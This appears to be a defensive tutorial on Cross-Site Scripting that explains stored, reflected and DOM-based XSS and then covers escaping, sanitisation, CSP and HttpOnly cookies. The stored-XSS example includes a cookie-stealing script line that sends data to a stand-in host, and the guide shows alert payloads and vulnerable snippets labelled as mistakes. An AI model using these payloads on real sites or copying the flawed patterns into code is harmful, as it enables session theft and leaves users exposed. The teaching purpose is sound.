Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious client-side scripts into web pages viewed by other users. The injected script runs in the context of the victim's browser, potentially stealing cookies, session tokens, personal data, or performing actions on behalf of the user.

**Types of XSS:**

**1. Stored XSS** — Malicious script is permanently stored on the server (database, comments, profiles):
```javascript
// Attacker submits a comment containing:
<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
// Every user viewing the comment executes the script
```

**2. Reflected XSS** — Script is reflected off the server in error messages, search results, or URLs:
```javascript
// URL: https://site.com/search?q=<script>alert('XSS')</script>
// Server reflects the query in the response without sanitizing
```

**3. DOM-based XSS** — Vulnerability exists in client-side JavaScript that processes untrusted data:
```javascript
// Vulnerable code
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = 'Hello ' + name;
// URL: ?name=<img src=x onerror=alert('XSS')>
```

**Prevention techniques:**

**1. Escape output (most important):**
```javascript
// Escape HTML entities
function escapeHTML(str) {
  return str.replace(/[&<>"']/g, (match) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
  }[match]));
}

// Use textContent instead of innerHTML
element.textContent = userInput; // Safe — treated as plain text

// Use DOMPurify for rich content
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

**2. Content Security Policy (CSP):**
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; style-src 'self' 'unsafe-inline'
```

**3. Input validation (defense in depth):**
```javascript
// Validate on the server — don't trust client-side validation
const emailSchema = z.string().email();
const result = emailSchema.safeParse(userInput);
if (!result.success) throw new Error('Invalid email');
```

**4. Framework protections:**

React automatically escapes JSX content:
```jsx
// Safe — React escapes the content
<p>{userInput}</p>

// Dangerous — bypasses escaping
<p dangerouslySetInnerHTML={{ __html: userInput }} />
```

**5. HttpOnly cookies** (prevent cookie theft):
```javascript
res.cookie('session', id, {
  httpOnly: true,   // JavaScript cannot access
  secure: true,     // HTTPS only
  sameSite: 'strict'
});
```

**6. Sanitize URLs:**
```javascript
// Don't allow javascript: protocol in URLs
function sanitizeURL(url) {
  const parsed = new URL(url, location.origin);
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    return '#';
  }
  return url;
}
```

**Common mistakes:**

```javascript
// ❌ innerHTML with user data
div.innerHTML = userComment;

// ❌ eval with user data
eval(userInput);

// ❌ document.write
document.write(userInput);

// ❌ href/src with user data
link.href = 'javascript:' + userInput;
img.src = userInput; // Can be used for tracking

// ✅ Safe alternatives
div.textContent = userComment;
link.href = sanitizeURL(userInput);
```

XSS remains one of the most common web vulnerabilities. The primary defense is escaping all dynamic output and using CSP as a second layer of defense.
